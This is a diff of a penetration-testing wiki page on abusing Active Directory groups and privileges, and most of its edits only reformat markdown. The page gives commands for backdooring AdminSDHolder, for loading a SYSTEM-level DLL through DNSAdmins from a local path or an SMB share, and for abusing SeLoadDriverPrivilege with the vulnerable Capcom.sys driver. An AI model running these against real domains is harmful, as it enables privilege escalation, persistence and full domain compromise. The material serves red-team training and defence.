@@ -10,11 +10,11 @@ There are other account memberships and access token privileges that can also be
 
 ## AdminSDHolder  group
 
-The Access Control List \(ACL\) of the **AdminSDHolder** object is used as a template to **copy** **permissions** to **all “protected groups”** in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.  
-By default, the ACL of this group is copied inside all the "protected groups". This is done to avoid intentional or accidental changes to these critical groups. However, if an attacker modifies the ACL of the group **AdminSDHolder** for example giving full permissions to a regular user, this user will have full permissions on all the groups inside the protected group \(in an hour\).  
-And if someone tries to delete this user from the Domain Admins \(for example\) in an hour or less, the user will be back in the group.
+The Access Control List (ACL) of the **AdminSDHolder **object is used as a template to **copy** **permissions **to **all “protected groups”** in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.\
+By default, the ACL of this group is copied inside all the "protected groups". This is done to avoid intentional or accidental changes to these critical groups. However, if an attacker modifies the ACL of the group **AdminSDHolder **for example giving full permissions to a regular user, this user will have full permissions on all the groups inside the protected group (in an hour).\
+And if someone tries to delete this user from the Domain Admins (for example) in an hour or less, the user will be back in the group.
 
-Add a user to the **AdminSDHolder** group:
+Add a user to the **AdminSDHolder **group:
 
 ```csharp
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
@@ -22,22 +22,22 @@ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=lo
 
 Check if the user is inside the **Domain Admins** group:
 
-```text
+```
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
 
 If you don't want to wait an hour you can use a PS script to make the restore happen instantly: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)
 
-\*\*\*\*[**More information in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)\*\*\*\*
+****[**More information in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)****
 
-## Account Operators <a id="account-operators"></a>
+## Account Operators <a href="account-operators" id="account-operators"></a>
 
 * Allows creating non administrator accounts and groups on the domain
 * Allows logging in to the DC locally
 
 Note the spotless' user membership:
 
-![](../../.gitbook/assets/1%20%282%29%20%281%29%20%281%29.png)
+![](<../../.gitbook/assets/1 (2) (1) (1).png>)
 
 However, we can still add new users:
 
@@ -47,7 +47,7 @@ As well as login to DC01 locally:
 
 ![](../../.gitbook/assets/a3.png)
 
-## Server Operators <a id="server-operators"></a>
+## Server Operators <a href="server-operators" id="server-operators"></a>
 
 This membership allows users to configure Domain Controllers with the following privileges:
 
@@ -71,7 +71,7 @@ The story changes:
 
 ![](../../.gitbook/assets/a6.png)
 
-## Backup Operators <a id="backup-operators"></a>
+## Backup Operators <a href="backup-operators" id="backup-operators"></a>
 
 As with `Server Operators` membership, we can access the `DC01` file system if we belong to `Backup Operators`:
 
@@ -81,19 +81,19 @@ As with `Server Operators` membership, we can access the `DC01` file system if w
 
 ### Resume
 
-A user who is member of the **DNSAdmins** group or have **write privileges to a DNS** server object can load an **arbitrary DLL** with **SYSTEM** privileges on the **DNS server**.  
-This is really interesting as the **Domain Controllers** are used very frequently as DNS servers.
+A user who is member of the **DNSAdmins **group or have **write privileges to a DNS** server object can load an **arbitrary DLL **with **SYSTEM **privileges on the **DNS server**.\
+This is really interesting as the** Domain Controllers** are used very frequently as DNS servers.
 
 ### Execute
 
-Then, if you have a user inside the DNSAdmins group, you can make the DNS server load an arbitrary DLL with SYSTEM privileges. You can make the DNS server load a local or remote \(shared by SMB\) DLL file executing:
+Then, if you have a user inside the DNSAdmins group, you can make the DNS server load an arbitrary DLL with SYSTEM privileges. You can make the DNS server load a local or remote (shared by SMB) DLL file executing:
 
-```text
+```
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 ```
 
-An example of a valid DLL can be found in [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). I would change the code of the function `DnsPluginInitialize`  to something like:
+An example of a valid DLL can be found in [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). I would change the code of the function `DnsPluginInitialize ` to something like:
 
 ```c
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
@@ -103,16 +103,16 @@ DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunct
 }
 ```
 
-So, when the **DNSservice** start or restart, a new user will be created.
+So, when the **DNSservice **start or restart, a new user will be created.
 
-Even having a user inside DNSAdmin group you **by default cannot stop and restart the DNS service.** But you can always try doing:
+Even having a user inside DNSAdmin group you **by default cannot stop and restart the DNS service. **But you can always try doing:
 
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
 
-\*\*\*\*[**Learn more about this privilege escalation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
+****[**Learn more about this privilege escalation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
 
 ## **AD Recycle Bin**
 
@@ -124,26 +124,26 @@ This group gives you permission to read deleted AD object. Something juicy infor
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 
-## Group Managed Service Accounts \(gMSA\)
+## Group Managed Service Accounts (gMSA)
 
  In most of the infrastructures, service accounts are typical user accounts with “**Password never expire**” option. Maintaining these accounts could be a real mess and that's why Microsoft introduced  **Managed Service Accounts:**
 
 * No more password management. It uses a complex, random, 240-character password and changes that automatically when it reaches the domain or computer password expire date. 
-  * It is uses Microsoft Key Distribution Service \(KDC\) to create and manage the passwords for the gMSA.
+  * It is uses Microsoft Key Distribution Service (KDC) to create and manage the passwords for the gMSA.
 * It cannot be lock out or use for interactive login
 * Supports to share across multiple hosts
-* Can use to run schedule tasks \(Managed service accounts do not support to run schedule tasks\)
-* Simplified SPN Management – System will automatically change the SPN value if **sAMaccount** details of the computer change or DNS name property change.
+* Can use to run schedule tasks (Managed service accounts do not support to run schedule tasks)
+* Simplified SPN Management – System will automatically change the SPN value if** sAMaccount** details of the computer change or DNS name property change.
 
- gMSA accounts have their passwords stored in a LDAP property called _**msDS-ManagedPassword**_ which **automatically** get **resets** by the DC’s every 30 days, are **retrievable** by **authorized administrators** and by the **servers** who they are installed on. _**msDS-ManagedPassword**_ is an encrypted data blob called [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) and it’s only retrievable when the connection is secured, **LDAPS** or when the authentication type is ‘Sealing & Secure’ for an example.
+ gMSA accounts have their passwords stored in a LDAP property called _**msDS-ManagedPassword**_ which **automatically** get **resets **by the DC’s every 30 days, are **retrievable **by **authorized administrators **and by the **servers **who they are installed on. _**msDS-ManagedPassword**_ is an encrypted data blob called [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) and it’s only retrievable when the connection is secured, **LDAPS **or when the authentication type is ‘Sealing & Secure’ for an example.
 
 ![Image from https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)
 
-So, if gMSA is being used, find if it has **special privileges** and also check if you have **permissions** to **read** the password of the services.
+So, if gMSA is being used, find if it has** special privileges** and also check if you have **permissions** to **read **the password of the services.
 
-Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
+Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read **the **password **of **gMSA**.
 
-## SeLoadDriverPrivilege <a id="seloaddriverprivilege"></a>
+## SeLoadDriverPrivilege <a href="seloaddriverprivilege" id="seloaddriverprivilege"></a>
 
 A very dangerous privilege to assign to any user - it allows the user to load kernel drivers and execute code with kernel privilges aka `NT\System`. See how `offense\spotless` user has this privilege:
 
@@ -207,7 +207,7 @@ We compile the above, execute and the privilege `SeLoadDriverPrivilege` is now e
 
 ![](../../.gitbook/assets/a10.png)
 
-### Capcom.sys Driver Exploit <a id="capcom-sys-driver-exploit"></a>
+### Capcom.sys Driver Exploit <a href="capcom-sys-driver-exploit" id="capcom-sys-driver-exploit"></a>
 
 To further prove the `SeLoadDriverPrivilege` is dangerous, let's **exploit it to elevate privileges**.
 
@@ -221,21 +221,21 @@ NTSTATUS NTLoadDriver(
 
 By default the driver service name should be under `\Registry\Machine\System\CurrentControlSet\Services\`
 
-But, according with to the **documentation** you **could** also **use** paths under **HKEY\_CURRENT\_USER**, so you could **modify** a **registry** there to **load arbitrary drivers** on the system.  
+But, according with to the **documentation **you **could **also **use **paths under **HKEY_CURRENT_USER**, so you could **modify** a **registry **there to **load arbitrary drivers** on the system.\
 The relevant parameters that must be defined in the new registry are:
 
-* **ImagePath:** REG\_EXPAND\_SZ type value which specifies the driver path. In this context, the path should be a directory with modification permissions by the non-privileged user.
-* **Type**: Value of type REG\_WORD in which the type of the service is indicated. For our purpose, the value should be defined as SERVICE\_KERNEL\_DRIVER \(0x00000001\).
+* **ImagePath: **REG_EXPAND_SZ type value which specifies the driver path. In this context, the path should be a directory with modification permissions by the non-privileged user.
+* **Type**: Value of type REG_WORD in which the type of the service is indicated. For our purpose, the value should be defined as SERVICE_KERNEL_DRIVER (0x00000001).
 
-Therefore you could create a new registry in **`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`** indicating in **ImagePath** the path to the driver and in **Type** the with value 1 and use those values on the exploit \(you can obtain the User SID using: `Get-ADUser -Identity 'USERNAME' | select SID` or `(New-Object System.Security.Principal.NTAccount("USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).value`
+Therefore you could create a new registry in **`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`** indicating in **ImagePath **the path to the driver and in **Type **the with value 1 and use those values on the exploit (you can obtain the User SID using: `Get-ADUser -Identity 'USERNAME' | select SID` or `(New-Object System.Security.Principal.NTAccount("USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).value`
 
 ```bash
 PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
 PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
 ```
 
-The first one declares a string variable indicating where the vulnerable **Capcom.sys** driver is located on the victim system and the second one is a string variable indicating a service name that will be used \(could be any service\).  
-Note, that the **driver must be signed by Windows** so you cannot load arbitrary drivers. But, **Capcom.sys** **can be abused to execute arbitrary code and is signed by Windows**, so the goal is to load this driver and exploit it.
+The first one declares a string variable indicating where the vulnerable **Capcom.sys** driver is located on the victim system and the second one is a string variable indicating a service name that will be used (could be any service).\
+Note, that the** driver must be signed by Windows** so you cannot load arbitrary drivers. But, **Capcom.sys** **can be abused to execute arbitrary code and is signed by Windows**, so the goal is to load this driver and exploit it.
 
  Load the driver:
 
@@ -328,7 +328,7 @@ Once the above code is compiled and executed, we can see that our malicious `Cap
 
 ![](../../.gitbook/assets/a11.png)
 
-Download: [Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)
+Download: [Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media\&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)
 
 **No it's time to abuse the loaded driver to execute arbitrary code.**
 
@@ -338,13 +338,13 @@ You can download exploits from [https://github.com/tandasat/ExploitCapcom](https
 
 ### Auto
 
-You can use [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/) to **automatically enable** the **privilege**, **create** the **registry key** under HKEY\_CURRENT\_USER and **execute NTLoadDriver** indicating the registry key that you want to create and the path to the driver:
+You can use [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/) to **automatically enable **the **privilege**, **create **the **registry key **under HKEY_CURRENT_USER and **execute NTLoadDriver **indicating the registry key that you want to create and the path to the driver:
 
-![](../../.gitbook/assets/image%20%2845%29.png)
+![](<../../.gitbook/assets/image (289).png>)
 
 Then, you will need to download a **Capcom.sys** exploit and use it to escalate privileges.
 
-## References <a id="references"></a>
+## References <a href="references" id="references"></a>
 
 {% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}
 
@@ -362,7 +362,7 @@ Then, you will need to download a **Capcom.sys** exploit and use it to escalate 
 
 {% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}
 
-{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp\#L13" %}
+{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}
 
 {% embed url="https://github.com/tandasat/ExploitCapcom" %}
 
@@ -373,6 +373,4 @@ Then, you will need to download a **Capcom.sys** exploit and use it to escalate 
 {% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}
 
 {% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}
-
-
 
